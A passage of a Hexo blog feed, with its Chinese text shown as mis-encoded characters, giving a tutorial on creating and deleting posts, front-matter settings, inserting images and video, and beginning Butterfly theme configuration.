        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="æ–°å»ºæ–‡ç« "><a href="#æ–°å»ºæ–‡ç« " class="headerlink" title="æ–°å»ºæ–‡ç« "></a>æ–°å»ºæ–‡ç« </h1><p>å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new [layout] title  æˆ–  hexo n [layout] title</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ–‡ç« å‰è¦å…ˆé€‰å®šæ¨¡æ¿ï¼Œåœ¨hexoä¸­ä¹Ÿå«åšå¸ƒå±€ã€‚hexoæ”¯æŒä¸‰ç§å¸ƒå±€ï¼ˆlayoutï¼‰ï¼špost(é»˜è®¤)ã€draftã€pageã€‚</p><p>è¿™å—å…ˆä»‹ç»å¦‚ä½•ä½¿ç”¨å·²æœ‰å¸ƒå±€ï¼Œåé¢è¿˜å°†ä¼šä»‹ç»å¦‚ä½•è‡ªå®šä¹‰å¸ƒå±€ã€‚</p><p>åœ¨åšå®¢ç›®å½•ä¸‹è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ—¶ï¼Œä¼šé»˜è®¤ä½¿ç”¨postå¸ƒå±€ï¼Œç„¶åè‡ªåŠ¨åœ¨source_postsç›®å½•ç”Ÿæˆä¸€ä¸ªtext.mdæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n text</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œå¸ƒå±€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n [layout_name] draft1</span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªä½¿ç”¨ç‰¹å®šå¸ƒå±€çš„åä¸ºdraft1çš„æ–‡ç« ã€‚</p><p>æ‰“å¼€ä¹‹å‰åˆ›å»ºçš„test.mdæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ç« å¼€å¤´åŒ…å«å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: text1</span><br><span class="line">author: luyao</span><br><span class="line">date: 2020-04-10 04:13:36</span><br><span class="line">tags: hexo</span><br><span class="line">categories: blog</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>å¦‚ä½•è‡ªå®šä¹‰å¸ƒå±€å‘¢ï¼Ÿå®é™…ä¸Šï¼Œå¸ƒå±€æ˜¯ä¸€ä¸ªmarkdownæ–‡ä»¶ï¼Œå®ƒä»¬ä¿å­˜åœ¨scaffolds&#x2F;ç›®å½•ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°hexoè‡ªå¸¦çš„ä¸‰ç§å¸ƒå±€å…¶å®å°±æ˜¯ä¸‰ä¸ª.mdæ–‡ä»¶ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022175.png" alt="image-20240410102220147">  </p><p>æ¯ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹å®é™…åªåŒ…å«ä¸€ä¸ªFront-matterã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022119.png" alt="image-20240410102227091">  </p><p>å› æ­¤ï¼Œå¯ä»¥åœ¨è¿™é‡Œä¿®æ”¹å¸ƒå±€æˆ–è€…å»ºç«‹æ–°çš„å¸ƒå±€ï¼Œç„¶ååˆ›å»ºæ–‡ç« æ—¶ä½¿ç”¨è¿™äº›å¸ƒå±€ã€‚</p><h1 id="å¼€å§‹å†™æ–‡ç« "><a href="#å¼€å§‹å†™æ–‡ç« " class="headerlink" title="å¼€å§‹å†™æ–‡ç« "></a>å¼€å§‹å†™æ–‡ç« </h1><p>ä¸¤ä¸ªè™šçº¿ä¹‹é—´çš„å†…å®¹å°±æ˜¯å«Front-matterï¼Œä¸»è¦æ˜¯æ–‡ç« çš„é…ç½®ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼Œä¸åŒä¸»é¢˜é…ç½®ä¸ä¸€æ ·ï¼Œè¿™å—ä»¥<strong>Matery</strong>ä¸»é¢˜ä¸ºä¾‹</p><p>Front-matter é€‰é¡¹ä¸­çš„æ‰€æœ‰å†…å®¹å‡ä¸º<strong>éå¿…å¡«</strong>çš„ã€‚ä½†æˆ‘ä»ç„¶å»ºè®®è‡³å°‘å¡«å†™ title å’Œ date çš„å€¼ã€‚</p><table><thead><tr><th align="center"><strong>é…ç½®é€‰é¡¹</strong></th><th align="center"><strong>é»˜è®¤å€¼</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td align="center">title</td><td align="center">Markdown çš„æ–‡ä»¶æ ‡é¢˜</td><td>æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td align="center">date</td><td align="center">æ–‡ä»¶åˆ›å»ºæ—¶é—´æ—¥æœŸ</td><td>å»ºè®®ä½¿ç”¨å‘å¸ƒæ—¥æœŸæ—¶é—´</td></tr><tr><td align="center">author</td><td align="center">æ ¹ _config.yml ä¸­çš„ author</td><td>æ–‡ç« ä½œè€…</td></tr><tr><td align="center">img</td><td align="center">featureImages ä¸­çš„æŸä¸ªå€¼</td><td>æ–‡ç« ç‰¹å¾å›¾ï¼Œæ¨èä½¿ç”¨å›¾åºŠ(è…¾è®¯äº‘ã€ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ç­‰)æ¥åšå›¾ç‰‡çš„è·¯å¾„.å¦‚: <a href="http://xxx.com/xxx.jpg">http://xxx.com/xxx.jpg</a></td></tr><tr><td align="center">top</td><td align="center">true</td><td>æ¨èæ–‡ç« ï¼ˆæ–‡ç« æ˜¯å¦ç½®é¡¶ï¼‰ï¼Œå¦‚æœ top å€¼ä¸º trueï¼Œåˆ™ä¼šä½œä¸ºé¦–é¡µæ¨èæ–‡ç« </td></tr><tr><td align="center">cover</td><td align="center">false</td><td>v1.0.2ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td align="center">coverImg</td><td align="center">æ— </td><td>v1.0.2ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td align="center">password</td><td align="center">æ— </td><td>æ–‡ç« é˜…è¯»å¯†ç ï¼Œå¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½® password çš„å€¼ï¼Œè¯¥å€¼å¿…é¡»æ˜¯ç”¨ SHA256 åŠ å¯†åçš„å¯†ç ï¼Œé˜²æ­¢è¢«ä»–äººè¯†ç ´ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ config.yml ä¸­æ¿€æ´»äº† verifyPassword é€‰é¡¹</td></tr><tr><td align="center">toc</td><td align="center">true</td><td>æ˜¯å¦å¼€å¯ TOCï¼Œå¯ä»¥é’ˆå¯¹æŸç¯‡æ–‡ç« å•ç‹¬å…³é—­ TOC çš„åŠŸèƒ½ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ config.yml ä¸­æ¿€æ´»äº† toc é€‰é¡¹</td></tr><tr><td align="center">mathjax</td><td align="center">false</td><td>æ˜¯å¦å¼€å¯æ•°å­¦å…¬å¼æ”¯æŒ ï¼Œæœ¬æ–‡ç« æ˜¯å¦å¼€å¯ mathjaxï¼Œä¸”éœ€è¦åœ¨ä¸»é¢˜çš„ _config.yml æ–‡ä»¶ä¸­ä¹Ÿéœ€è¦å¼€å¯æ‰è¡Œ</td></tr><tr><td align="center">summary</td><td align="center">æ— </td><td>æ–‡ç« æ‘˜è¦ï¼Œè‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</td></tr><tr><td align="center">categories</td><td align="center">æ— </td><td>æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td align="center">tags</td><td align="center">æ— </td><td>æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr><tr><td align="center">keywords</td><td align="center">æ–‡ç« æ ‡é¢˜</td><td>æ–‡ç« å…³é”®å­—ï¼ŒSEO æ—¶éœ€è¦</td></tr><tr><td align="center">reprintPolicy</td><td align="center">cc_by</td><td>æ–‡ç« è½¬è½½è§„åˆ™ï¼Œ å¯ä»¥æ˜¯ cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint æˆ– pay ä¸­çš„ä¸€ä¸ª</td></tr></tbody></table><p>ä»¥ä¸‹ä¸ºæ–‡ç« çš„ Front-mattreç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexoå¼€å§‹å†™åšå®¢</span><br><span class="line">date: 2024-03-26 09:25:00</span><br><span class="line">author: Muhe</span><br><span class="line">img: /source/images/xxx.jpg</span><br><span class="line">top: true</span><br><span class="line">cover: true</span><br><span class="line">coverImg: /images/1.jpg</span><br><span class="line">password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span><br><span class="line">toc: false</span><br><span class="line">mathjax: false</span><br><span class="line">summary: è¿™æ˜¯ä½ è‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</span><br><span class="line">categories: Markdown</span><br><span class="line">tags:</span><br><span class="line">  - Typora</span><br><span class="line">  - Markdown</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>ã€Tipsã€‘å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡hexo nçš„æ—¶å€™Front-matterä¸­å†…å®¹å°‘çš„å¯æ€œï¼Œé‚£æ€ä¹ˆä¿®æ”¹é»˜è®¤çš„æ ¼å¼å‘¢ï¼Ÿåªè¦å»ä¸»ç›®å½•ä¸‹æ‰¾åˆ°scaffoldsæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°ä¸€ä¸ªpost.mdæ–‡ä»¶ä¿®æ”¹å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"># æ ‡é¢˜</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">author: æ— æ•Œå°å°å¼‹</span><br><span class="line"># ç®€è¿°</span><br><span class="line">summary:</span><br><span class="line"># ä½¿ç”¨è‡ªå®šä¹‰å°é¢ </span><br><span class="line">img: </span><br><span class="line"># æ˜¯å¦ç½®é¡¶trueï¼Œæˆ–è€…å»æ‰</span><br><span class="line">top: true</span><br><span class="line"># è½®æ’­</span><br><span class="line">cover:</span><br><span class="line"># è½®æ’­å›¾</span><br><span class="line">coverImg: </span><br><span class="line"># æ ‡ç­¾</span><br><span class="line">tags: </span><br><span class="line"># åˆ†ç±»</span><br><span class="line">categories: </span><br><span class="line"># æ˜¯å¦åŠ å¯†æ–‡ç« ï¼ŒSHA256åŠ å¯†</span><br><span class="line">password: </span><br><span class="line">---</span><br></pre></td></tr></table></figure><h1 id="æ–‡ç« æ’å…¥å›¾ç‰‡"><a href="#æ–‡ç« æ’å…¥å›¾ç‰‡" class="headerlink" title="æ–‡ç« æ’å…¥å›¾ç‰‡"></a>æ–‡ç« æ’å…¥å›¾ç‰‡</h1><p>å›¾ç‰‡å‡ ä¹æ˜¯å†™åšå®¢æ—¶ä¸å¯æˆ–ç¼ºçš„å…ƒç´ ã€‚åœ¨hexoä¸­æ’å…¥å›¾ç‰‡éœ€è¦å…ˆè¿›è¡Œä¸€äº›è®¾ç½®ï¼Œä¸è¿‡åœ¨ä»‹ç»é‚£ä¹‹å‰è®©æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹markdownå¼•ç”¨å›¾ç‰‡çš„è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![alt](path [title])</span><br></pre></td></tr></table></figure><ul><li>pathæ˜¯å¿…é€‰çš„ï¼Œè¡¨ç¤ºå›¾ç‰‡çš„è·¯å¾„ï¼Œå¯ä½¿ç”¨ç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„ã€‚</li><li>altæ˜¯å¯é€‰çš„ï¼Œæ˜¯å›¾ç‰‡æ— æ³•åŠ è½½æ—¶çš„æ›¿ä»£æè¿°æ–‡æœ¬ã€‚</li><li>titleæ˜¯å¯é€‰çš„ï¼Œæ˜¯å›¾ç‰‡çš„æ ‡é¢˜ã€‚</li></ul><p>åœ¨hexoä¸­ï¼Œå¼•ç”¨å›¾ç‰‡ä¸æ˜¯ç®€å•çš„ä½¿ç”¨ä¸Šè¿°è¯­æ³•å³å¯ï¼Œä½ è¿˜éœ€è¦ä¸ºå›¾ç‰‡åˆ¶å®šä¸€ä¸ª<strong>èµ„æºæ–‡ä»¶å¤¹</strong>ã€‚å…·ä½“æ¥è¯´ï¼Œhexoä¸­æ–‡ç« å¼•ç”¨å›¾ç‰‡æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li><p>å°†æ‰€æœ‰æ–‡ç« çš„å›¾ç‰‡æ”¾åˆ°source&#x2F;images æ–‡ä»¶å¤¹ä¸­ï¼ˆæ²¡æœ‰å°±è‡ªå·±åˆ›å»ºä¸€ä¸ªï¼‰ï¼Œç„¶åä½¿ç”¨markdownè¯­å¥å¼•ç”¨å›¾ç‰‡ã€‚è¿™ç§æ–¹æ³•ä¸€èˆ¬é€‚ç”¨äºåŒ…å«å°‘é‡å›¾ç‰‡çš„hexoé¡¹ç›®ï¼Œä½†æ˜¯å½“æ–‡ç« æ•°é‡å¢å¤šï¼Œå›¾ç‰‡æ•°ä¹Ÿéšä¹‹å¢åŠ åï¼Œè¯¥ç®¡ç†æ–¹å¼å°±æ˜¾å¾—æœ‰äº›æ··ä¹±ã€‚å› æ­¤æˆ‘ä¸ªäººæ¨èä½ ä½¿ç”¨ä¸‹é¢ä¸€ç§æ–¹æ³•ã€‚</p></li><li><p>ä¸ºæ¯ä¸€ä¸ªæ–‡ç« åˆ›å»ºä¸€ä¸ªèµ„æºæ–‡ä»¶å¤¹ï¼Œå°†å›¾ç‰‡ä¿å­˜å…¶ä¸­ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li><p>åœ¨åšå®¢æ ¹ç›®å½•æ‰“å¼€_config.ymlæ–‡ä»¶åšå¦‚ä¸‹ä¿®æ”¹ï¼š<br>yaml post_asset_folder: true</p></li><li><p>ç„¶åä½¿ç”¨hexo n textå‘½ä»¤ååˆ›å»ºä¸€ä¸ªä½¿ç”¨postå¸ƒå±€åä¸ºtextçš„æ–‡ç« ï¼Œä½ å°†å‘ç°hexoåœ¨\source_postæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºäº†ä¸€ä¸ª\textæ–‡ä»¶å¤¹ä»¥åŠåŒåçš„.mdæ–‡ä»¶ï¼š</p></li><li><p>æœ€åå°±å¯ä»¥æ‰“å¼€text.mdæ–‡ä»¶è¿›è¡Œç¼–è¾‘äº†ï¼Œä½ å¯ä»¥æŠŠè¦å¼•ç”¨çš„å›¾ç‰‡æ”¾åˆ°åŒåæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œå¼•ç”¨ã€‚<strong>æ³¨æ„</strong>ï¼šè¯·ä¸è¦è‡ªä½œèªæ˜å°†text.mdæ–‡ä»¶ç§»åŠ¨åˆ°åŒåæ–‡ä»¶å¤¹ä¸‹ï¼Œç»æœ¬äººå°è¯•ï¼Œå‘ç°è¿™æ ·ä¼šå¯¼è‡´å›¾ç‰‡æ— æ³•æ­£å¸¸å¼•ç”¨ã€‚</p></li></ul></li></ol><p><strong>Tip</strong>ï¼šå¦‚æœä½ ä½¿ç”¨çš„æ˜¯<a href="https://link.zhihu.com/?target=https://www.typora.io/">Typora</a>ç¼–è¾‘å™¨ï¼Œå¯ä»¥åœ¨ç¼–è¾‘å™¨çš„æ–‡ä»¶&#x2F;åå¥½è®¾ç½®&#x2F;å›¾åƒä¸­è¿›è¡Œå¦‚ä¸‹è®¾ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022069.png" alt="image-20240410102243042">  </p><p>è¿™æ ·æ¯æ¬¡ç›´æ¥æ‹·è´åˆ°æ–‡ç« çš„æˆªå›¾å°†ä¼šè¢«è‡ªåŠ¨ä¿å­˜åˆ°åŒåçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œéå¸¸æ–¹ä¾¿~</p><p>ä½†æœ‰å¯èƒ½è®¾ç½®äº†ä¸Šé¢çš„ç›¸å…³é…ç½®åï¼Œå›¾ç‰‡ä¾æ—§åŠ è½½ä¸å‡ºæ¥ï¼Œä¸‹é¢æ˜¯ä¸¤ç§è§£å†³åŠæ³•ï¼š</p><h2 id="æœ¬åœ°å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥"><a href="#æœ¬åœ°å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥" class="headerlink" title="æœ¬åœ°å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥"></a>æœ¬åœ°å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥</h2><p>æ’ä»¶<a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a>è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚å¯ä»¥ç›´æ¥ç”¨npm install hexo-renderer-markedå‘½ä»¤ç›´æ¥å®‰è£…ï¼Œä¹‹ååœ¨config.yamlä¸­æ›´æ”¹é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure><p>hexoä¸‰è¿åï¼Œæœ¬åœ°åŠ è½½çš„å›¾ç‰‡å°±å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ã€‚</p><h2 id="åœ¨çº¿å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥"><a href="#åœ¨çº¿å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥" class="headerlink" title="åœ¨çº¿å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥"></a>åœ¨çº¿å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥</h2><p>è¿™ä¸ªè§£å†³æ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦æ–‡ç« çš„å¤´éƒ¨å¦‚ä¸‹å›¾æ‰€ç¤ºä½ç½®æ·»åŠ <meta name="referrer" content="no-referrer"/>è¿™ä¸€å¥è¯å°±å¯ä»¥å®Œç¾è§£å†³é—®é¢˜</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022344.png" alt="image-20240410102251316">  </p><h1 id="æ’å…¥è§†é¢‘"><a href="#æ’å…¥è§†é¢‘" class="headerlink" title="æ’å…¥è§†é¢‘"></a>æ’å…¥è§†é¢‘</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video width=&quot;480&quot; height=&quot;320&quot; controls&gt;</span><br><span class="line">     &lt;source src=video_path&gt;</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure><ul><li>video_pathæ˜¯è§†é¢‘çš„å­˜å‚¨è·¯å¾„ï¼ˆå«åŒå¼•å·ï¼‰ï¼Œä½ å¯ä»¥æŠŠè§†é¢‘æ”¾åœ¨æ–‡ç« çš„åŒåèµ„æºæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åç”¨ç›¸å¯¹è·¯å¾„æ–¹å¼å¼•ç”¨ã€‚</li><li>widthå’Œheightæ˜¯è§†é¢‘åŒºå—çš„å®½åº¦å’Œé«˜åº¦ï¼Œå¯è‡ªå®šä¹‰ã€‚</li></ul><h1 id="åˆ é™¤æ–‡ç« "><a href="#åˆ é™¤æ–‡ç« " class="headerlink" title="åˆ é™¤æ–‡ç« "></a>åˆ é™¤æ–‡ç« </h1><p>åˆ é™¤æ–‡ç« çš„è¿‡ç¨‹ä¸€æ ·ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆåˆ é™¤æœ¬åœ°æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ç”Ÿæˆå’Œéƒ¨ç½²å‘½ä»¤è¿›è€Œå°†è¿œç¨‹ä»“åº“ä¸­çš„æ–‡ä»¶ä¹Ÿä¸€å¹¶åˆ é™¤ã€‚å…·ä½“æ¥è¯´ï¼Œä»¥æœ€å¼€å§‹é»˜è®¤å½¢æˆçš„helloworld.mdè¿™ç¯‡æ–‡ç« ä¸ºä¾‹ã€‚</p><p>é¦–å…ˆè¿›å…¥åˆ°source &#x2F; _post æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰¾åˆ°helloworld.mdæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°ç›´æ¥æ‰§è¡Œåˆ é™¤ã€‚ç„¶åä¾æ¬¡æ‰§è¡Œhexo gï¼Œhexo dï¼Œå†å»ä¸»é¡µæŸ¥çœ‹ä½ å°±ä¼šå‘ç°ä½ çš„åšå®¢ä¸Šé¢å·²ç»ç©ºç©ºå¦‚ä¹Ÿäº†ï¼Œè¿™å°±æ˜¯å¦‚ä½•åˆ é™¤æ–‡ç« çš„æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªå®šä¹‰åšå®¢ä¸»é¢˜ç›¸å…³è®¾ç½®</title>
      <link href="/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"/>
      <url>/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å®‰è£…butterflyä¸»é¢˜"><a href="#å®‰è£…butterflyä¸»é¢˜" class="headerlink" title="å®‰è£…butterflyä¸»é¢˜"></a>å®‰è£…butterflyä¸»é¢˜</h1><p>é¦–å…ˆï¼Œåœ¨hexoçš„æ ¹ç›®å½•ä¸‹ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸‹è½½ä¸»é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npmå®‰è£…pug å’Œ stylus æ¸²æŸ“å™¨ã€‚ä¸ç„¶ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼ˆç§°ä¸ºç«™ç‚¹é…ç½®æ–‡ä»¶ï¼‰ï¼Œå¼€å¯ä¸»é¢˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>ã€å»ºè®®ã€‘</p><p>ä¸ºäº†å‡å°‘å‡çº§&#x2F;ä¿®æ”¹ä¸»é¢˜å¸¦æ¥çš„ä¸ä¾¿ï¼Œå¯ä»¥å°†ä¸»é¢˜ç›®å½•ä¸‹ï¼ˆ&#x2F;blog&#x2F;themeï¼‰çš„é…ç½®æ–‡ä»¶ _config.yml é‡å‘½åä¸º _config.butterfly.ymlï¼Œå¤åˆ¶åˆ° Hexo æ ¹ç›®å½•ä¸‹ä¸_config.ymlåŒçº§ã€‚</p><p>Hexoä¼šè‡ªåŠ¨åˆå¹¶ä¸»é¢˜ä¸­çš„_config.ymlå’Œ _config.butterfly.yml ï¼Œå¦‚æœå­˜åœ¨åŒåé…ç½®ï¼Œä¼šä½¿ç”¨_config.butterfly.ymlçš„é…ç½®ï¼Œå…¶ä¼˜å…ˆåº¦è¾ƒé«˜ã€‚æ‰€ä»¥åƒå’Œåšå®¢ç½‘å€ç›¸å…³è”çš„å›ºå®šèµ„æ–™å¯ä»¥è®¾ç½®åœ¨_config.ymlä¸­ï¼Œæ¯”å¦‚åšå®¢çš„æ ‡é¢˜ã€ä½œè€…ä¿¡æ¯å’Œé‚®ç®±ç­‰ç­‰èµ„æ–™ï¼Œè€Œå’Œä¸»é¢˜æ ·å¼ç›¸å…³çš„é…ç½®æ”¾åœ¨ _config.butterfly.yml ä¸­ï¼Œé‚£ä¹ˆåœ¨å°†æ¥ä½ æƒ³æ¢ä¸€ä¸ªä¸»é¢˜æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091730067.png" alt="image-20240409173030013"> </p><h1 id="å¯¼èˆªæ èœå•"><a href="#å¯¼èˆªæ èœå•" class="headerlink" title="å¯¼èˆªæ èœå•"></a>å¯¼èˆªæ èœå•</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ _config.butterfly.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  ä¸»é¡µ: / || fas fa-home</span><br><span class="line">  åšæ–‡ || fa fa-graduation-cap:</span><br><span class="line">    åˆ†ç±»: /categories/ || fa fa-archive</span><br><span class="line">    æ ‡ç­¾: /tags/ || fa fa-tags</span><br><span class="line">    å½’æ¡£: /archives/ || fa fa-folder-open</span><br><span class="line">  ç”Ÿæ´» || fas fa-list:</span><br><span class="line">    åˆ†äº«: /shuoshuo/ || fa fa-comments-o</span><br><span class="line">    ç›¸å†Œ: /photos/ || fa fa-camera-retro</span><br><span class="line">    éŸ³ä¹: /music/ || fa fa-music</span><br><span class="line">    å½±è§†: /movies/ || fas fa-video</span><br><span class="line">  å‹é“¾: /links/ || fa fa-link</span><br><span class="line">  ç•™è¨€æ¿: /comment/ || fa fa-paper-plane</span><br><span class="line">  #ç•™è¨€æ¿: /messageboard/ || fa fa-paper-plane</span><br><span class="line">  å…³äºç¬”è€…: /about/ || fas fa-heart  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731911.png" alt="image-20240409173101879">  </p><h1 id="ä»£ç å—æ˜¾ç¤º"><a href="#ä»£ç å—æ˜¾ç¤º" class="headerlink" title="ä»£ç å—æ˜¾ç¤º"></a>ä»£ç å—æ˜¾ç¤º</h1><p>åœ¨_config.butterfly.ymlé…ç½®æ–‡ä»¶ä¸­å¯ä»¥é…ç½®å¦‚ä¸‹åŠŸèƒ½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: mac  #  darker / pale night / light / ocean / mac / mac light / false ä»£ç ä¸»é¢˜</span><br><span class="line">highlight_copy: true # å¤åˆ¶æŒ‰é’®</span><br><span class="line">highlight_lang: false # æ˜¯å¦æ˜¾ç¤ºä»£ç è¯­è¨€</span><br><span class="line">highlight_shrink: false # true: ä»£ç å—é»˜è®¤ä¸å±•å¼€ / false: ä»£ç å—é»˜è®¤å±•å¼€ | none: å±•å¼€å¹¶éšè—æŠ˜å æŒ‰é’®</span><br><span class="line">highlight_height_limit: false # unit: px</span><br><span class="line">code_word_wrap: false #ä»£ç è‡ªåŠ¨æ¢è¡Œï¼Œå…³é—­æ»šåŠ¨æ¡</span><br></pre></td></tr></table></figure><p>åŒæ—¶å°†ç«™ç‚¹é»˜è®¤é…ç½®æ–‡ä»¶_config.ymlçš„highlightè®¾ç½®ä¸ºfalseã€‚</p><figure 